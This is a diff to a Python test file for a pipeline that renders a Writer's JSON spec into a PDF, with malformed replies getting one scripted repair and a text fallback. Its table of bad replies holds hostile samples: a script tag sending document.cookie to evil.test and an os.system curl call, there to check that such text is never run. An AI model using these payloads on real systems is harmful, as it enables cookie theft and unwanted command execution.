@@ -1,7 +1,5 @@
-"""LW-10 (ADR-0029): a Writer's deliver unit for a PDF emits DeliverableSpec JSON; `render_pdf` runs in-process and the
-bytes are stored with origin `render`. No model call is added (a scripted fake model), no paid call, no network.
-
-Not done here: the `app` half (AppSpec and `app.spec`) waits for the contracts in PR #684.
+"""LW-10 (ADR-0029): a Writer's valid DeliverableSpec renders in process and stores a PDF with origin `render`.
+Malformed replies get one scripted fake repair, then useful text when a file still cannot be built. No paid call.
 """
 
 from __future__ import annotations
@@ -10,6 +8,7 @@ import asyncio
 import json
 import subprocess
 import sys
+from datetime import date
 from pathlib import Path
 from typing import Any
 
@@ -52,7 +51,7 @@ class Script(FakeModelProvider):
 
 def run_runner(reply: str, brief: Any = PDF_BRIEF, unit: dict[str, Any] = UNIT) -> tuple[Any, Script]:
     provider = Script(reply)
-    runner = ToolUnitRunner({"writer": provider})
+    runner = ToolUnitRunner({"writer": provider}, today=lambda: date(2026, 10, 16))
     outcome = asyncio.run(runner.run(unit, UnitContext("A_s0", (), brief=brief)))
     return outcome, provider
 
@@ -61,7 +60,7 @@ class AsDeliver:
     """Runs the shared runner as a writer's `deliver` unit (the harness test plans build specialist units)."""
 
     def __init__(self, reply: str, brief: Any = PDF_BRIEF) -> None:
-        self.inner, self.brief = ToolUnitRunner({"writer": Script(reply)}), brief
+        self.inner, self.brief = ToolUnitRunner({"writer": Script(reply)}, today=lambda: date(2026, 10, 16)), brief
 
     async def run(self, unit: dict[str, Any], context: UnitContext) -> Any:
         unit = unit | {"role": "writer", "unit_type": "deliver"}
@@ -129,7 +128,6 @@ BAD = {
     "script": "<script>fetch('https://evil.test/' + document.cookie)</script>",
     "python": "import os\nos.system('curl https://evil.test')",
     "unknown field": json.dumps(SPEC | {"script": "alert(1)"}),
-    "missing date": json.dumps({k: v for k, v in SPEC.items() if k != "date"}),
     "bad chart link": json.dumps(SPEC | {"charts": [dict(SPEC["charts"][0], table_id="nope")]}),
     "nan": GOOD.replace('"Sales rose."', '"x"').replace('["2026", 6]', '["2026", NaN]'),
     "duplicate keys": '{"title": "a", "title": "b", "date": "2026-10-08"}',
@@ -139,14 +137,29 @@ BAD = {
 }
 
 
-@pytest.mark.parametrize("reply", list(BAD.values()), ids=list(BAD))
-def test_LW_10_a_reply_that_is_not_one_valid_spec_fails_the_unit_and_stores_nothing(reply: str, tmp_path: Path) -> None:
+def test_HR_1_FR_INT_missing_model_date_is_stamped_by_code() -> None:
+    outcome, _ = run_runner(json.dumps({k: v for k, v in SPEC.items() if k != "date"}))
+    assert outcome.success and json.loads(outcome.outputs[0].spec_text)["date"] == "2026-10-16"
+
+
+@pytest.mark.parametrize(("case", "reply"), list(BAD.items()), ids=list(BAD))
+def test_LW_10_a_reply_that_is_not_one_valid_spec_gets_one_repair_then_safe_text(
+    case: str, reply: str, tmp_path: Path
+) -> None:
     outcome, provider = run_runner(reply)
-    assert not outcome.success and outcome.outputs == () and len(provider.requests) == 1
+    if case in {"oversize", "blank"}:
+        assert not outcome.success and outcome.outputs == () and len(provider.requests) == 1
+    else:
+        assert outcome.success and outcome.outputs[0].media_type == "text/markdown"
+        assert outcome.outputs[0].content == reply.encode("utf-8")
+        assert len(provider.requests) == 2
+        assert provider.requests[1].json_mode and provider.requests[1].tools is None
     assert "evil.test" not in outcome.summary and "Sales" not in outcome.summary  # a plain, fixed reason
     ran = run_units(tmp_path, {"U1": None}, runner=AsDeliver(reply), with_archive=True)
-    assert not ran.result.outcomes["U1"].success
-    assert ran.of("artifact.created") == [] and ran.rig.meta.paths() == [] and ran.rig.blobs._blobs == {}
+    assert ran.result.outcomes["U1"].success is (case not in {"oversize", "blank"})
+    assert len(ran.of("artifact.created")) == (0 if case in {"oversize", "blank"} else 1)
+    if case in {"oversize", "blank"}:
+        assert ran.rig.meta.paths() == [] and ran.rig.blobs._blobs == {}
 
 
 def test_LW_10_script_like_text_inside_a_valid_spec_is_printed_never_run() -> None:
